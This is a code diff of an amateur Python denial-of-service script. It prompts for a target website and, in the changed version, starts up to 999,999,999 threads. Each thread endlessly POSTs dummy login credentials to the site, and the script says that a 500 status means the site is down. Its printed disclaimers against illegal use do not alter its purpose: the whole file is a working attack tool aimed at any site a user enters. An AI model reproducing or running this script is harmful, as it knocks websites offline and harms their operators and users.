@@ -1,18 +1,25 @@
-print("This is a DoS script.  !  DON'T  !   use it for illegal purposes!")
+print("This is a DoS script.  !  DON'T  !   use it for illegal purposes, you WILL GET CAUGHT.")
 print("The creator of this is not responisble for any illegal use by others.")
 print("! ! IMPORTANT ! ! : To stop the script you must close the program yourself NOT BY A BUTTON.")
 print("! ! IMPORTANT ! ! : As soon as you see status 500 or more that means that the website is down.")
 
 import requests
+from bs4 import BeautifulSoup
 from threading import Thread
+import keyboard
 
 url= input("Paste the website that you want to stress (www. or https://) :")
+x = 1
+headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
 
 
 def go():
-        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-        response= requests.post(url, headers=headers)
+    response= requests.post(url, headers=headers)
+    while True:
         status=(response)
         print(status)
-        for x in range(30):
-            Thread(target=go).start()
+        response= requests.post(url, headers=headers,data={'username': 'dumbass', 'pass': 'poop'})
+
+
+for i in range(999999999):
+    Thread(target=go).start()
